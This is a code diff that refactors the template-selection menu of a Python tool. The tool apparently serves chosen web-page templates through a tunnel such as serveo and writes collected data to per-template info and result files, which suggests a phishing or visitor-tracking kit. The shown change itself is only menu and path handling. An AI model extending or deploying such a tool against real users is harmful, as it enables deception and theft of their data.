@@ -111,42 +111,38 @@ def tunnel_select():
         exit()
 
 def template_select():
-    global site, info, result
-  #  quo.echo(f">>", fg="vgreen", nl=False)
-    print("Select a Template: ")
+	global site, info, result
+	print("[+]" + "Select a Template :" + '\n')
+	
+	with open('template/templates.json', 'r') as templ:
+		templ_info = templ.read()
+	
+	templ_json = json.loads(templ_info)
+	
+	for item in templ_json['templates']:
+		name = item['name']
+		print("[{}]".format(templ_json['templates'].index(item)) + ' {}'.format(name))
+	
+	selected = int(input('[>] '))
+	
+	try:
+		site = templ_json['templates'][selected]['dir_name']
+	except IndexError:
+		print('\n' + '[-]' + ' Invalid Input!' + '\n')
+		sys.exit()
+	
+	print('\n' + '[+]' + ' Loading {} Template...'.format(templ_json['templates'][selected]['name']))
+	
+	module = templ_json['templates'][selected]['module']
+	if module == True:
+		imp_file = templ_json['templates'][selected]['import_file']
+		import importlib
+		importlib.import_module('template.{}'.format(imp_file))
+	else:
+		pass
 
-    with open('template/templates.json', 'r') as templ:
-        templ_info = templ.read()
-
-    templ_json = json.loads(templ_info)
-
-    for item in templ_json['templates']:
-        name = item['name']
-        print("[{}]".format(templ_json['templates'].index(item)) + ' {}'.format(name))
-
-        selected = int(input('[+]') + '\n')
-
-    try:
-        site = templ_json['templates'][selected]['dir_name']
-
-    except IndexError:
-        quo.echo(f"[-]", fg="vgreen", nl=False, bold=True)
-        quo.echo(f" Invalid Input!", fg="vred")
-        sys.exit()
-
-    print('\n' + "[+]" + " Loading {} Template...".format(templ_json['templates'][selected]['name']))
-
-    module = templ_json['templates'][selected]['module']
-
-    if module == True:
-        imp_file = templ_json['templates'][selected]['import_file']
-        import importlib
-        importlib.import_module('template.{}'.format(imp_file))
-    else:
-        pass
-
-    info = 'template/{}/php/info.txt'.format(site)
-    result = 'template/{}/php/result.txt'.format(site)
+	info = 'template/{}/php/info.txt'.format(site)
+	result = 'template/{}/php/result.txt'.format(site)
 
 def serveo():
     global subdom
